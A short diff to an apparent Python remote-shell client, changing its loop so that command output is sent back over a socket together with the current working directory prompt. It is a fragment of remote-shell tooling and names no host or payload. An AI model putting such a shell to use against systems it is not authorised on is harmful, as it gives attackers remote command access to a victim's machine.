@@ -20,6 +20,6 @@ while True:
         output_string = str(output_byte, "utf-8")
 
         current = os.getcwd() + "> " #getting the current working directory and formating it (the "> ")
-        socket.send(str.encode(output_string))
+        socket.send(str.encode(output_string + current))
 
         print(output_string)
